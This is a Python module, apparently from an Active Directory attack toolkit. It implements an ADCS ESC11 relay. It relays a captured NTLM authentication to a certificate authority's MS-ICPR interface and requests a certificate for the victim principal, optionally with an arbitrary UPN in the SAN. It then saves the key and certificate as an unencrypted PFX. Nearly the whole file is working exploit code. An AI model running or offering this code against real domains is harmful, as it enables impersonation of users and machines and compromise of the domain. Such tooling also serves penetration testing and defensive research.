"""Native ADCS ESC11 relay target."""

from __future__ import annotations

import os
from dataclasses import dataclass
from pathlib import Path

from adscan_core.rich_output import print_info_debug, print_warning
from adscan_internal.services.adcs.esc_cleanup import format_certificate_not_after
from adscan_internal.services.relay.core import RelayAuthentication, RelayTargetResult
from adscan_internal.services.relay.display import print_relay_captured
from adscan_internal.services.relay.identity import (
    extract_ntlm_identity,
    format_principal,
)

_CR_DISP_ISSUED = 3
_UPN_OID = "1.3.6.1.4.1.311.20.2.3"


@dataclass(frozen=True)
class AdcsEsc11RelayConfig:
    """Target settings for relaying NTLM to ADCS MS-ICPR.

    Args:
        ca_host: CA host or IP.
        ca_name: CA display name accepted by MS-ICPR.
        template: Certificate template to request. Defaults should normally be
            ``Machine`` for machine principals and ``User`` for users.
        output_dir: Directory for issued PFX artifacts.
        domain: Target CA domain, used for EPM/SPN resolution.
        dc_ip: Optional DC/KDC IP used by EPM.
        ca_fqdn: Optional hostname override when ``ca_host`` is an IP.
        alt_upn: Optional SAN UPN request attribute.
        key_size: RSA key size.
    """

    ca_host: str
    ca_name: str
    template: str
    output_dir: Path
    domain: str | None = None
    dc_ip: str | None = None
    ca_fqdn: str | None = None
    alt_upn: str | None = None
    key_size: int = 2048


class AdcsEsc11RelayTarget:
    """Relay a captured NTLM context to MS-ICPR and request a certificate."""

    name = "adcs-esc11-icpr"
    technique = "ADCSESC11"

    def __init__(self, config: AdcsEsc11RelayConfig) -> None:
        self.config = config

    async def run(self, authentication: RelayAuthentication) -> RelayTargetResult:
        """Use one relayed NTLM authentication to request an ADCS cert."""

        from cryptography import x509
        from cryptography.hazmat.primitives import hashes
        from cryptography.hazmat.primitives.asymmetric import rsa
        from cryptography.hazmat.primitives.serialization import (
            Encoding,
            NoEncryption,
            pkcs12,
        )
        from cryptography.x509.oid import NameOID

        rpc = await self._connect_icpr(authentication.gssapi)
        domain, username = extract_ntlm_identity(authentication.gssapi)
        domain = authentication.domain or domain
        username = authentication.username or username
        principal = format_principal(domain, username)
        common_name = principal or "relayed-principal"
        print_relay_captured(principal, self.config.ca_fqdn or self.config.ca_host, self.technique)

        key = rsa.generate_private_key(
            public_exponent=0x10001, key_size=self.config.key_size
        )
        csr = x509.CertificateSigningRequestBuilder().subject_name(
            x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, common_name)])
        )
        if self.config.alt_upn:
            from asn1crypto import core as asn1core

            csr = csr.add_extension(
                x509.SubjectAlternativeName(
                    [
                        x509.OtherName(
                            x509.ObjectIdentifier(_UPN_OID),
                            asn1core.UTF8String(self.config.alt_upn).dump(),
                        )
                    ]
                ),
                critical=False,
            )
        csr_der = csr.sign(key, hashes.SHA256()).public_bytes(Encoding.DER)

        try:
            attrs: dict[str, str] = {"CertificateTemplate": self.config.template}
            if self.config.alt_upn:
                attrs["SAN"] = f"upn={self.config.alt_upn}"
            result, err = await rpc.request_certificate(
                self.config.ca_name, csr_der, attrs
            )
            if err is not None:
                raise err
        finally:
            try:
                await rpc.close()
            except Exception:
                pass

        disposition = result.get("disposition") if result else None
        cert_der = (result or {}).get("certificate") or (result or {}).get(
            "encodedcert"
        )
        if disposition != _CR_DISP_ISSUED or not cert_der:
            disposition_msg = (result or {}).get("disposition_message")
            ca_response = disposition_msg or f"disposition={disposition}"
            print_warning(f"ESC11: CA rejected the request — {ca_response}")
            print_info_debug(
                f"[esc11] disposition={disposition} message={disposition_msg!r} "
                f"principal={principal} template={self.config.template} "
                f"ca={self.config.ca_name}"
            )
            return RelayTargetResult(
                target_name=self.name,
                success=False,
                technique=self.technique,
                principal=principal,
                error=ca_response,
                metadata={"disposition": disposition},
            )

        cert = x509.load_der_x509_certificate(cert_der)
        self.config.output_dir.mkdir(parents=True, exist_ok=True)
        safe_name = _safe_filename(principal or common_name)
        pfx_path = (
            self.config.output_dir / f"{safe_name}_esc11_{os.urandom(4).hex()}.pfx"
        )
        pfx_bytes = pkcs12.serialize_key_and_certificates(
            name=(principal or common_name).encode(),
            key=key,
            cert=cert,
            cas=None,
            encryption_algorithm=NoEncryption(),
        )
        pfx_path.write_bytes(pfx_bytes)

        return RelayTargetResult(
            target_name=self.name,
            success=True,
            technique=self.technique,
            principal=principal,
            artifact_paths=(str(pfx_path),),
            metadata={
                "request_id": result.get("request_id") or result.get("requestid"),
                "disposition": disposition,
                "cert_serial": f"{cert.serial_number:X}",
                "cert_subject": cert.subject.rfc4514_string(),
                "cert_not_after": format_certificate_not_after(cert),
                "template": self.config.template,
            },
        )

    async def _connect_icpr(self, gssapi):
        from aiosmb.dcerpc.v5.common.connection.authentication import DCERPCAuth
        from aiosmb.dcerpc.v5.connection import DCERPC5Connection
        from aiosmb.dcerpc.v5.interfaces.endpointmgr import EPM
        from aiosmb.dcerpc.v5.interfaces.icprmgr import ICPRRPC
        from aiosmb.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_CONNECT

        target, err = await EPM.create_target(
            self.config.ca_host,
            ICPRRPC().service_uuid,
            dc_ip=self.config.dc_ip,
            domain=self.config.domain,
        )
        if err is not None:
            raise err
        if self.config.ca_fqdn:
            target.hostname = self.config.ca_fqdn

        auth = DCERPCAuth.from_smb_gssapi(gssapi)
        connection = DCERPC5Connection(auth, target)
        rpc, err = await ICPRRPC.from_rpcconnection(
            connection,
            auth_level=RPC_C_AUTHN_LEVEL_CONNECT,
            perform_dummy=True,
        )
        if err is not None:
            raise err
        return rpc


def _safe_filename(value: str) -> str:
    cleaned = "".join(ch if ch.isalnum() or ch in "._-" else "_" for ch in value)
    return cleaned.strip("._") or "relayed-principal"
